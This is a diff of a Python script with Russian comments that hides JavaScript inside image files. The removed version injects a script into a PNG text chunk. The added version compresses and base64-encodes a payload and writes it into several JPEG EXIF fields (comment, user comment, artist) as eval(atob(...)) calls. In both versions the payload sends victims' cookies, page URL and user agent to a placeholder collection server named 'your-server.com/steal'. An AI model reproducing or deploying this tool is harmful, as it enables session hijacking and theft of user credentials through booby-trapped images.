@@ -1,35 +1,45 @@
 #!/usr/bin/env python3
-import struct, zlib, sys
+from PIL import Image
+import piexif
+import base64
+import zlib
 
-def png_inject(image_path, output_path, js_code):
-    with open(image_path, 'rb') as f:
-        data = bytearray(f.read())
-    
-    # Проверка сигнатуры PNG
-    if data[:8] != b'\x89PNG\r\n\x1a\n':
-        raise ValueError("Не PNG файл")
-    
-    # Создаем iTXt chunk (UTF-8, сжатый)
-    keyword = b"XML:com.adobe.xmp"
-    text_data = f'<x:xmpmeta><rdf:Description rdf:about=""><script>{js_code}</script></rdf:Description></x:xmpmeta>'.encode('utf-8')
-    
-    chunk_data = keyword + b'\x00\x00\x00\x00' + text_data
-    chunk_len = struct.pack('>I', len(chunk_data))
-    chunk_type = b'iTXt'
-    crc = struct.pack('>I', zlib.crc32(chunk_type + chunk_data) & 0xffffffff)
-    
-    new_chunk = chunk_len + chunk_type + chunk_data + crc
-    
-    # Вставка после IHDR
-    ihdr_end = 8 + 8 + struct.unpack('>I', data[8:12])[0]
-    pos = ihdr_end + 4
-    data[pos:pos] = new_chunk
-    
-    with open(output_path, 'wb') as f:
-        f.write(data)
-    
-    print(f"[+] JS внедрен в {output_path}")
+# Ваш JS код
+js_code = """
+fetch('https://your-server.com/steal', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({
+        cookies: document.cookie,
+        url: location.href,
+        ua: navigator.userAgent
+    })
+});
+"""
 
-if __name__ == "__main__":
-    js = "alert('Malicious PNG'); fetch('https://your-server.com/steal?cookie='+document.cookie)"
-    png_inject("clean.png", "malicious.png", js)
+# Сжимаем и кодируем
+compressed = zlib.compress(js_code.encode())
+b64_js = base64.b64encode(compressed).decode()
+
+# Открываем изображение
+img = Image.open("clean.jpg")
+
+# СОЗДАЕМ НОВЫЙ EXIF, если его нет
+exif_dict = {"0th": {}, "Exif": {}, "GPS": {}, "1st": {}}
+
+# Добавляем данные в 0th (ImageIFD)
+exif_dict["0th"][piexif.ImageIFD.XPComment] = f"__{b64_js}__".encode('utf-16le')
+
+# Добавляем в Exif
+exif_dict["Exif"][piexif.ExifIFD.UserComment] = f"<script>eval(atob('{b64_js}'))</script>".encode()
+
+# Добавляем в Artist поле
+exif_dict["0th"][piexif.ImageIFD.Artist] = f"eval(atob('{b64_js}'))".encode()
+
+# Конвертируем в байты
+exif_bytes = piexif.dump(exif_dict)
+
+# Сохраняем с EXIF
+img.save("malicious.jpg", exif=exif_bytes, quality=95)
+
+print("[+] Готово: malicious.jpg")
